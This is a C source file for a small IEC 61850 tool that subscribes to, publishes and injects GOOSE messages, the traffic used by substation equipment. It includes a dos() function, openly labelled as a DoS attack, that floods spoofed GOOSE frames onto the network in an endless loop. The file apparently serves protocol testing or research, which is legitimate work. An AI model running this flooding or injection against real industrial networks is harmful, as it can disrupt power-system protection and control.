/**
 * \file n61850_goose.c
 * \brief GOOSE oriented methods
 * \author Devaud Mathieu, Marty Kilian
 * \version 0.1
 * \date 21 January 2015
 *
 * 
 *
 */


/*
 *
 *	libIEC61850 is free software: you can redistribute it and/or modify
 *	it under the terms of the GNU General Public License as published by
 *	the Free Software Foundation, either version 3 of the License, or
 *	(at your option) any later version.
 *
 *	libIEC61850 is distributed in the hope that it will be useful,
 *	but WITHOUT ANY WARRANTY; without even the implied warranty of
 *	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *	GNU General Public License for more details.
 *
 *	You should have received a copy of the GNU General Public License
 *	along with libIEC61850.  If not, see <http://www.gnu.org/licenses/>.
 *
 *	See COPYING file for the complete license text.
 */
#include <string.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <signal.h>

#include "n61850_global.h"

#include "hal.h"
#include "hal_thread.h"
#include "goose_publisher.h"

/* Catching signals to stop when DOS attack */
static void catchSignal      (int signal);
static void createCatchSignal(void);

static int running = 1;
static GoosePublisher publisher_dos;

void sigint_handler(int signalId) {

    running = 0;
}

//---------------------------------------------------------------------------------
/**
 * \fn void gooseListener(GooseSubscriber subscriber, void* parameter)
 * \brief Method to listen the goose when subscriber
 */
//---------------------------------------------------------------------------------
void gooseListener(GooseSubscriber subscriber, void* parameter) {

printf("GOOSE event:\n");
    printf("  stNum: %u sqNum: %u\n", GooseSubscriber_getStNum(subscriber),
            GooseSubscriber_getSqNum(subscriber));
    printf("  timeToLive: %u\n", GooseSubscriber_getTimeAllowedToLive(subscriber));
    printf("  timestamp: %llu\n", GooseSubscriber_getTimestamp(subscriber));

    MmsValue* values = GooseSubscriber_getDataSetValues(subscriber);

    char buffer[1024];

    MmsValue_printToBuffer(values, buffer, 1024);

    printf("%s\n", buffer);
}

//---------------------------------------------------------------------------------
/**
 * \fn void subscribe() 
 * \brief Method to subscribe
 */
//---------------------------------------------------------------------------------
void subscribe() {


	GooseSubscriber subscriber = GooseSubscriber_create(p_parameter->data_attribute_reference, NULL);

    GooseSubscriber_setAppId(subscriber, p_parameter->appid);

    GooseSubscriber_setListener(subscriber, gooseListener, NULL);
    
    GooseSubscriber_setInterfaceId(subscriber, "eth0");

    GooseSubscriber_subscribe(subscriber); 

    signal(SIGINT, sigint_handler);

    while (running) {
        Thread_sleep(100);
    }

    GooseSubscriber_destroy(subscriber);
}

//---------------------------------------------------------------------------------
/**
 * \fn void publish() 
 * \brief Method to publish
 */
//---------------------------------------------------------------------------------
void publish() {

	LinkedList dataSetValues = LinkedList_create();	

	if (p_parameter->data_type == DATA_TYPE_BOOLEAN) {
		if(!strcmp((char*)p_parameter->value,"true"))
			LinkedList_add(dataSetValues, MmsValue_newBoolean(true));
		else if(!strcmp((char*)p_parameter->value,"false"))
			LinkedList_add(dataSetValues, MmsValue_newBoolean(false));
		else
			printf("Error in data value\n");			
        }
        else if (p_parameter->data_type == DATA_TYPE_INTEGER) {
		LinkedList_add(dataSetValues, MmsValue_newIntegerFromInt32(atoi((char*)p_parameter->value)));
        } 
	else
		printf("No argument added to goose message \n");

	GoosePublisher publisher = GoosePublisher_create(NULL, "eth0");
	
	
	/* use it to set some parameters */
	/*
	CommParameters gooseCommParameters;
	gooseCommParameters.appId = p_parameter->appid;
	gooseCommParameters.dstAddress[0] = 0x01;
	gooseCommParameters.dstAddress[1] = 0x0c;
	gooseCommParameters.dstAddress[2] = 0xcd;
	gooseCommParameters.dstAddress[3] = 0x01;
	gooseCommParameters.dstAddress[4] = 0x00;
	gooseCommParameters.dstAddress[5] = 0x01;
	gooseCommParameters.vlanId = 0;
	gooseCommParameters.vlanPriority = 4;
	*/
	
	GoosePublisher_setGoCbRef(publisher, p_parameter->description_id);
	GoosePublisher_setConfRev(publisher, 1);
	GoosePublisher_setDataSetRef(publisher, p_parameter->data_set_id);

	if (GoosePublisher_publish(publisher, dataSetValues) == -1) {
		printf("Error sending message!\n");
	}
	GoosePublisher_destroy(publisher);
}

//---------------------------------------------------------------------------------
/**
 * \fn void dos() 
 * \brief Method to create a dos attack
 */
//---------------------------------------------------------------------------------
void dos() {

	printf("DOS Attack running ...\n");
	
	createCatchSignal ();

	/* Creating data to send */
	LinkedList dataSetValues = LinkedList_create();	
	LinkedList_add(dataSetValues, MmsValue_newBoolean(true));

	/* Create the Goose */
	publisher_dos = GoosePublisher_create(NULL, "eth0");
	GoosePublisher_setGoCbRef(publisher_dos, p_parameter->description_id);
	GoosePublisher_setConfRev(publisher_dos, 1);
	GoosePublisher_setDataSetRef(publisher_dos, "dos");

	while(1) {
		if (GoosePublisher_publish(publisher_dos, dataSetValues) == -1) {
			printf("Error sending message!\n");
		}	
	}	
	
}

//---------------------------------------------------------------------------------
/**
 * \fn static void createCatchSignal(void)
 * \brief Methods to create catched signals
 */
//---------------------------------------------------------------------------------
static void createCatchSignal(void) {
	struct sigaction act;

    act.sa_handler = catchSignal;
    sigemptyset (&act.sa_mask);
    act.sa_flags   = 0;
    sigaction (SIGINT,  &act, 0);
    sigaction (SIGTSTP, &act, 0);
    sigaction (SIGTERM, &act, 0);
    sigaction (SIGABRT, &act, 0);
}

//---------------------------------------------------------------------------------
/**
 * \fn static void catchSignal (int signal) 
 * \brief Method to catch signals
 */
//---------------------------------------------------------------------------------
static void catchSignal (int signal) {
    printf ("signal = %d\n", signal);
    printf("Clearing ressources ...\n");
    GoosePublisher_destroy(publisher_dos);
}


